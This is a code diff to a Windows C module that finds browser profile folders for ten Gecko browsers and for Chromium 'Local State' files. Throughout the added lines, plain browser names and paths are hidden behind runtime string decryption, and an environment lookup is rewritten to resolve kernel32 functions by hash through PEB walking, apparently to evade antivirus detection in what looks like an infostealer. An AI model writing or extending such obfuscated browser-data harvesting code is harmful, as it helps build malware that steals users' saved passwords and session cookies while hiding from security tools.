@@ -1,5 +1,6 @@
 #include "browser_paths.h"
 #include "hash.h"
+#include <windows.h>
 #include "nt_types.h"
 #include "peb.h"
 #include "export_resolve.h"
@@ -10,7 +11,6 @@
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <windows.h>
 
 static int bp_strieq(const char *a, const char *b);
 static int bp_is_dup(const BrowserPath *out, size_t n, const char *path, int roaming);
@@ -546,19 +546,66 @@ static void init_browser_tables(void) {
 
 /* ── Merged discovery buffers ─────────────────────────────────── */
 
-/* Gecko browsers — process_name mapped to actual exe stems */
-static const BrowserPath gecko_browsers[] = {
-    {"Firefox",    "Mozilla\\Firefox\\Profiles",    1, "firefox"},
-    {"Waterfox",   "Waterfox\\Profiles",            1, "waterfox"},
-    {"Pale Moon",  "Moon\\Profiles",                1, "palemoon"},
-    {"SeaMonkey",  "SeaMonkey\\Profiles",           1, "seamonkey"},
-    {"IceDragon",  "Cyberfox\\Profiles",            1, "icedragon"},
-    {"Basilisk",   "Basilisk\\Profiles",            1, "basilisk"},
-    {"K-Meleon",   "K-Meleon\\Profiles",            1, "kmeleon"},
-    {"GNU IceCat", "IceCat\\Profiles",              1, "icecat"},
-    {"Swiftweasel","Swiftweasel\\Profiles",          1, "swiftweasel"},
-    {"Floorp",     "Floorp\\Profiles",              1, "floorp"},
-};
+/* Gecko browsers — decrypted at runtime from enc_strings.h */
+static BrowserPath gecko_browsers[10];
+static int gecko_tables_init = 0;
+
+static void init_gecko_tables(void) {
+    if (gecko_tables_init) return;
+    static char _gn[10][32], _gp[10][128], _gpr[10][32];
+
+    enc_decrypt(enc_gecko_firefox_name, ENC_GECKO_FIREFOX_NAME_LEN, _gn[0]);
+    enc_decrypt(enc_gecko_firefox_path, ENC_GECKO_FIREFOX_PATH_LEN, _gp[0]);
+    enc_decrypt(enc_gecko_firefox_proc, ENC_GECKO_FIREFOX_PROC_LEN, _gpr[0]);
+    gecko_browsers[0] = (BrowserPath){_gn[0], _gp[0], 1, _gpr[0]};
+
+    enc_decrypt(enc_gecko_waterfox_name, ENC_GECKO_WATERFOX_NAME_LEN, _gn[1]);
+    enc_decrypt(enc_gecko_waterfox_path, ENC_GECKO_WATERFOX_PATH_LEN, _gp[1]);
+    enc_decrypt(enc_gecko_waterfox_proc, ENC_GECKO_WATERFOX_PROC_LEN, _gpr[1]);
+    gecko_browsers[1] = (BrowserPath){_gn[1], _gp[1], 1, _gpr[1]};
+
+    enc_decrypt(enc_gecko_palemoon_name, ENC_GECKO_PALEMOON_NAME_LEN, _gn[2]);
+    enc_decrypt(enc_gecko_palemoon_path, ENC_GECKO_PALEMOON_PATH_LEN, _gp[2]);
+    enc_decrypt(enc_gecko_palemoon_proc, ENC_GECKO_PALEMOON_PROC_LEN, _gpr[2]);
+    gecko_browsers[2] = (BrowserPath){_gn[2], _gp[2], 1, _gpr[2]};
+
+    enc_decrypt(enc_gecko_seamonkey_name, ENC_GECKO_SEAMONKEY_NAME_LEN, _gn[3]);
+    enc_decrypt(enc_gecko_seamonkey_path, ENC_GECKO_SEAMONKEY_PATH_LEN, _gp[3]);
+    enc_decrypt(enc_gecko_seamonkey_proc, ENC_GECKO_SEAMONKEY_PROC_LEN, _gpr[3]);
+    gecko_browsers[3] = (BrowserPath){_gn[3], _gp[3], 1, _gpr[3]};
+
+    enc_decrypt(enc_gecko_icedragon_name, ENC_GECKO_ICEDRAGON_NAME_LEN, _gn[4]);
+    enc_decrypt(enc_gecko_icedragon_path, ENC_GECKO_ICEDRAGON_PATH_LEN, _gp[4]);
+    enc_decrypt(enc_gecko_icedragon_proc, ENC_GECKO_ICEDRAGON_PROC_LEN, _gpr[4]);
+    gecko_browsers[4] = (BrowserPath){_gn[4], _gp[4], 1, _gpr[4]};
+
+    enc_decrypt(enc_gecko_basilisk_name, ENC_GECKO_BASILISK_NAME_LEN, _gn[5]);
+    enc_decrypt(enc_gecko_basilisk_path, ENC_GECKO_BASILISK_PATH_LEN, _gp[5]);
+    enc_decrypt(enc_gecko_basilisk_proc, ENC_GECKO_BASILISK_PROC_LEN, _gpr[5]);
+    gecko_browsers[5] = (BrowserPath){_gn[5], _gp[5], 1, _gpr[5]};
+
+    enc_decrypt(enc_gecko_kmeleon_name, ENC_GECKO_KMELEON_NAME_LEN, _gn[6]);
+    enc_decrypt(enc_gecko_kmeleon_path, ENC_GECKO_KMELEON_PATH_LEN, _gp[6]);
+    enc_decrypt(enc_gecko_kmeleon_proc, ENC_GECKO_KMELEON_PROC_LEN, _gpr[6]);
+    gecko_browsers[6] = (BrowserPath){_gn[6], _gp[6], 1, _gpr[6]};
+
+    enc_decrypt(enc_gecko_icecat_name, ENC_GECKO_ICECAT_NAME_LEN, _gn[7]);
+    enc_decrypt(enc_gecko_icecat_path, ENC_GECKO_ICECAT_PATH_LEN, _gp[7]);
+    enc_decrypt(enc_gecko_icecat_proc, ENC_GECKO_ICECAT_PROC_LEN, _gpr[7]);
+    gecko_browsers[7] = (BrowserPath){_gn[7], _gp[7], 1, _gpr[7]};
+
+    enc_decrypt(enc_gecko_swiftweasel_name, ENC_GECKO_SWIFTWEASEL_NAME_LEN, _gn[8]);
+    enc_decrypt(enc_gecko_swiftweasel_path, ENC_GECKO_SWIFTWEASEL_PATH_LEN, _gp[8]);
+    enc_decrypt(enc_gecko_swiftweasel_proc, ENC_GECKO_SWIFTWEASEL_PROC_LEN, _gpr[8]);
+    gecko_browsers[8] = (BrowserPath){_gn[8], _gp[8], 1, _gpr[8]};
+
+    enc_decrypt(enc_gecko_floorp_name, ENC_GECKO_FLOORP_NAME_LEN, _gn[9]);
+    enc_decrypt(enc_gecko_floorp_path, ENC_GECKO_FLOORP_PATH_LEN, _gp[9]);
+    enc_decrypt(enc_gecko_floorp_proc, ENC_GECKO_FLOORP_PROC_LEN, _gpr[9]);
+    gecko_browsers[9] = (BrowserPath){_gn[9], _gp[9], 1, _gpr[9]};
+
+    gecko_tables_init = 1;
+}
 
 #define MAX_MERGED_BROWSERS 128
 
@@ -619,6 +666,7 @@ const BrowserPath *get_chromium_browsers(size_t *count) {
  * 2. Static 10-entry fallback table
  */
 const BrowserPath *get_gecko_browsers(size_t *count) {
+    init_gecko_tables();
     if (!gecko_merged) {
         merged_gecko_count = 0;
 
@@ -1286,9 +1334,21 @@ int discover_chromium_browsers_registry(BrowserPath *out,
                     snprintf(probe, sizeof(probe),
                              "%s\\User Data\\Local State", parent_dir);
                     if (!file_exists(probe)) {
-                        /* Try %LOCALAPPDATA% derived path */
-                        char *env_local = getenv("LOCALAPPDATA");
-                        if (env_local) {
+                        /* Try %LOCALAPPDATA% derived path (PEB-walked, no CRT) */
+                        char env_local[MAX_PATH] = {0};
+                        {   wchar_t wkey[16];
+                            enc_decrypt_wide(enc_wLOCALAPPDATA, ENC_WLOCALAPPDATA_LEN, wkey);
+                            wchar_t wval[MAX_PATH];
+                            char dll_k[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll_k);
+                            void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll_k));
+                            if (k32) {
+                                typedef DWORD (WINAPI *fnGEVW)(LPCWSTR, LPWSTR, DWORD);
+                                fnGEVW pGEV = (fnGEVW)({ char fn_e[32]; enc_decrypt(enc_GetEnvironmentVariableW, ENC_GETENVIRONMENTVARIABLEW_LEN, fn_e); mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn_e)); });
+                                if (pGEV && pGEV(wkey, wval, MAX_PATH) > 0)
+                                    bp_wtoa(wval, env_local, MAX_PATH);
+                            }
+                        }
+                        if (env_local[0]) {
                             snprintf(probe, sizeof(probe),
                                      "%s\\%s\\User Data\\Local State",
                                      env_local, basename_of(parent_dir));
